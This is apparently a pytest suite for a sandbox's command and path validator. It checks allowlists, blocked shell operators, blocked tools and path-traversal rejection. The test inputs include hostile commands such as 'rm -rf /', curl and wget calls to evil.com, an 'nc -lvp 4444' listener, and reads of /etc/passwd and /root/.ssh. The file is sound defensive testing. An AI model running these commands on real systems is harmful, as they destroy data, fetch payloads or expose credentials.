"""Tests for sandbox/security.py -- command validation and path traversal prevention.

This module is security-critical: it is the primary defence against
arbitrary command execution and filesystem escapes inside sandboxed
containers.  We test both allowlisted and blocklisted patterns
thoroughly, including edge-cases around word boundaries, operator
substrings, and path components.
"""

import pytest

from sandbox.security import (
    ALLOWED_COMMANDS,
    BLOCKED_COMMANDS,
    BLOCKED_PATHS,
    sanitize_output,
    validate_command,
    validate_path,
)

# =========================================================================
# validate_command -- happy paths
# =========================================================================


class TestValidateCommandAllowed:
    """Commands that SHOULD be allowed."""

    @pytest.mark.parametrize("cmd", ALLOWED_COMMANDS)
    def test_bare_allowed_commands(self, cmd: str) -> None:
        """Each bare allowlisted command should pass."""
        ok, err = validate_command(cmd)
        assert ok is True, f"{cmd!r} should be allowed: {err}"
        assert err == ""

    def test_npm_install(self) -> None:
        ok, _ = validate_command("npm install react")
        assert ok is True

    def test_npx_with_args(self) -> None:
        ok, _ = validate_command("npx create-react-app my-app")
        assert ok is True

    def test_node_script(self) -> None:
        ok, _ = validate_command("node index.js")
        assert ok is True

    def test_cat_file(self) -> None:
        ok, _ = validate_command("cat src/App.tsx")
        assert ok is True

    def test_ls_flag(self) -> None:
        ok, _ = validate_command("ls -la src")
        assert ok is True

    def test_grep_pattern(self) -> None:
        ok, _ = validate_command("grep -rn TODO src")
        assert ok is True

    def test_echo_message(self) -> None:
        ok, _ = validate_command("echo hello world")
        assert ok is True

    def test_mkdir_p(self) -> None:
        ok, _ = validate_command("mkdir -p src/components")
        assert ok is True

    def test_rm_file(self) -> None:
        ok, _ = validate_command("rm old-file.txt")
        assert ok is True

    def test_cp_file(self) -> None:
        ok, _ = validate_command("cp src/a.ts src/b.ts")
        assert ok is True

    def test_mv_file(self) -> None:
        ok, _ = validate_command("mv old.tsx new.tsx")
        assert ok is True

    def test_touch_file(self) -> None:
        ok, _ = validate_command("touch README.md")
        assert ok is True

    def test_head_file(self) -> None:
        ok, _ = validate_command("head -n 10 package.json")
        assert ok is True

    def test_tail_file(self) -> None:
        ok, _ = validate_command("tail -n 20 server.log")
        assert ok is True

    def test_wc_file(self) -> None:
        ok, _ = validate_command("wc -l src/App.tsx")
        assert ok is True

    def test_find_files(self) -> None:
        ok, _ = validate_command("find src -name '*.tsx'")
        assert ok is True


# =========================================================================
# validate_command -- unrestricted sandbox mode
# =========================================================================


class TestValidateCommandUnrestricted:
    """When unrestricted=True, allow arbitrary shell commands."""

    def test_allows_non_allowlisted_command(self) -> None:
        ok, err = validate_command("git status", unrestricted=True)
        assert ok is True
        assert err == ""

    def test_allows_shell_operators(self) -> None:
        ok, err = validate_command(
            "npm install && npm run build | cat",
            unrestricted=True,
        )
        assert ok is True
        assert err == ""

    def test_null_byte_still_blocked(self) -> None:
        ok, err = validate_command("echo hi\x00there", unrestricted=True)
        assert ok is False
        assert "null byte" in err.lower()


# =========================================================================
# validate_command -- empty / whitespace
# =========================================================================


class TestValidateCommandEmpty:
    """Empty or whitespace-only commands must be rejected."""

    def test_empty_string(self) -> None:
        ok, err = validate_command("")
        assert ok is False
        assert "empty" in err.lower()

    def test_whitespace_only(self) -> None:
        ok, err = validate_command("   ")
        assert ok is False
        assert "empty" in err.lower()


# =========================================================================
# validate_command -- blocked operators
# =========================================================================


class TestValidateCommandBlockedOperators:
    """Shell operators that must be rejected."""

    @pytest.mark.parametrize(
        "cmd",
        [
            "npm install | grep react",       # pipe
            "npm install && npm start",        # and-chain
            "npm test || echo fail",           # or-chain
            "npm install; rm -rf /",           # semicolon
            "echo $(whoami)",                  # command substitution
            "echo `whoami`",                   # backtick substitution
            "npm install > /dev/null",         # redirect out
            "npm install < input.txt",         # redirect in
            "npm install >> log.txt",          # append redirect
        ],
    )
    def test_blocked_operator(self, cmd: str) -> None:
        ok, err = validate_command(cmd)
        assert ok is False
        assert "Blocked operator" in err

    def test_pipe_in_middle(self) -> None:
        ok, err = validate_command("ls src | wc -l")
        assert ok is False
        assert "Blocked operator" in err


# =========================================================================
# validate_command -- blocked commands (word-boundary regex)
# =========================================================================


class TestValidateCommandBlockedCommands:
    """Blocked commands matched by word-boundary regex."""

    @pytest.mark.parametrize("cmd", BLOCKED_COMMANDS)
    def test_bare_blocked(self, cmd: str) -> None:
        """Each blocked command used as the first word should be rejected."""
        ok, err = validate_command(cmd)
        assert ok is False
        assert "Blocked command" in err or "not in allowlist" in err

    def test_curl_http(self) -> None:
        ok, err = validate_command("curl http://evil.com")
        assert ok is False
        assert "Blocked command" in err

    def test_wget_http(self) -> None:
        ok, err = validate_command("wget http://evil.com/payload")
        assert ok is False
        assert "Blocked command" in err

    def test_nc_listener(self) -> None:
        ok, err = validate_command("nc -lvp 4444")
        assert ok is False
        assert "Blocked command" in err

    def test_ssh_remote(self) -> None:
        ok, err = validate_command("ssh user@host")
        assert ok is False
        assert "Blocked command" in err

    # Word-boundary edge cases: the blocked command appears as part of
    # another word that IS allowed.

    def test_curly_not_blocked(self) -> None:
        """'curly' contains 'curl' but should NOT be matched."""
        # 'curly' is not in the allowlist so it will be rejected for
        # a different reason (not in allowlist), but crucially not
        # because of the blocked command regex.
        ok, err = validate_command("curly braces")
        assert ok is False
        assert "Blocked command" not in err, (
            "'curly' falsely matched 'curl' blocked command pattern"
        )

    def test_ncat_not_blocked_by_nc(self) -> None:
        """'ncat' should NOT be blocked by the \\bnc\\b pattern."""
        ok, err = validate_command("ncat something")
        assert ok is False
        # It should fail for "not in allowlist" not "Blocked command: nc"
        assert "Blocked command" not in err

    def test_blocked_command_in_argument(self) -> None:
        """A blocked command appearing in an argument should still be caught."""
        ok, err = validate_command("npm install curl")
        assert ok is False
        assert "Blocked command" in err


# =========================================================================
# validate_command -- blocked system paths
# =========================================================================


class TestValidateCommandBlockedPaths:
    """System paths that must be rejected."""

    @pytest.mark.parametrize("path", BLOCKED_PATHS)
    def test_direct_blocked_path(self, path: str) -> None:
        ok, err = validate_command(f"cat {path}/passwd")
        assert ok is False
        assert "Blocked path" in err

    def test_etc_passwd(self) -> None:
        ok, err = validate_command("cat /etc/passwd")
        assert ok is False
        assert "Blocked path" in err

    def test_var_log(self) -> None:
        ok, err = validate_command("cat /var/log/syslog")
        assert ok is False
        assert "Blocked path" in err

    def test_usr_bin(self) -> None:
        ok, err = validate_command("ls /usr/bin")
        assert ok is False
        assert "Blocked path" in err

    def test_root_dir(self) -> None:
        ok, err = validate_command("ls /root/.ssh")
        assert ok is False
        assert "Blocked path" in err


# =========================================================================
# validate_command -- path traversal
# =========================================================================


class TestValidateCommandPathTraversal:
    """Path traversal via .. must be blocked."""

    def test_dotdot_relative(self) -> None:
        ok, err = validate_command("cat ../../../etc/passwd")
        assert ok is False
        assert "traversal" in err.lower()

    def test_dotdot_in_middle(self) -> None:
        ok, err = validate_command("cat src/../../secret")
        assert ok is False
        assert "traversal" in err.lower()

    def test_double_dots_in_filename_ok(self) -> None:
        """A filename like 'file..bak' should NOT trigger path traversal.

        The implementation splits on '/' and checks if '..' appears as a
        complete path component.
        """
        ok, _ = validate_command("cat file..bak")
        # This should pass the traversal check (but may fail on allowlist etc.)
        # The important thing: it should NOT be rejected for "path traversal"
        # Actually cat IS in the allowlist, so this should be fully allowed.
        assert ok is True

    def test_dotdot_as_path_component(self) -> None:
        """'src/../secret' should be caught."""
        ok, err = validate_command("cat src/../secret")
        assert ok is False
        assert "traversal" in err.lower()


# =========================================================================
# validate_command -- unlisted commands
# =========================================================================


class TestValidateCommandNotInAllowlist:
    """Commands not in the allowlist should be rejected."""

    @pytest.mark.parametrize(
        "cmd",
        ["python3 exploit.py", "bash -c whoami", "sh script.sh", "ruby evil.rb"],
    )
    def test_unlisted_command(self, cmd: str) -> None:
        ok, err = validate_command(cmd)
        assert ok is False
        assert "not in allowlist" in err


# =========================================================================
# validate_path
# =========================================================================


class TestValidatePath:
    """Path validation for sandbox file operations."""

    def test_valid_relative_path(self) -> None:
        ok, err, resolved = validate_path("/workspace", "src/App.tsx")
        assert ok is True
        assert err == ""
        assert resolved.startswith("/")

    def test_nested_path(self) -> None:
        ok, err, resolved = validate_path("/workspace", "src/components/Button.tsx")
        assert ok is True
        assert "Button.tsx" in resolved

    def test_empty_path(self) -> None:
        ok, err, resolved = validate_path("/workspace", "")
        assert ok is False
        assert "empty" in err.lower()
        assert resolved == ""

    def test_dotdot_traversal(self) -> None:
        ok, err, resolved = validate_path("/workspace", "../etc/passwd")
        assert ok is False
        assert "traversal" in err.lower()
        assert resolved == ""

    def test_absolute_path_rejected(self) -> None:
        ok, err, resolved = validate_path("/workspace", "/etc/passwd")
        assert ok is False
        assert "Absolute" in err
        assert resolved == ""

    def test_sneaky_traversal(self) -> None:
        ok, err, resolved = validate_path("/workspace", "foo/../../etc/passwd")
        assert ok is False
        assert "traversal" in err.lower()

    def test_simple_filename(self) -> None:
        ok, err, resolved = validate_path("/workspace", "README.md")
        assert ok is True
        assert "README.md" in resolved


# =========================================================================
# sanitize_output
# =========================================================================


class TestSanitizeOutput:
    """Output sanitization."""

    def test_short_output_unchanged(self) -> None:
        assert sanitize_output("hello") == "hello"

    def test_empty_output(self) -> None:
        assert sanitize_output("") == ""

    def test_truncation(self) -> None:
        long_text = "x" * 60000
        result = sanitize_output(long_text, max_length=50000)
        assert len(result) < 60000
        assert "truncated" in result
        assert "10000 chars omitted" in result

    def test_custom_max_length(self) -> None:
        text = "y" * 200
        result = sanitize_output(text, max_length=100)
        assert len(result) < 200
        assert "truncated" in result

    def test_exact_boundary(self) -> None:
        text = "z" * 100
        result = sanitize_output(text, max_length=100)
        # At exactly max_length it should NOT be truncated
        assert result == text
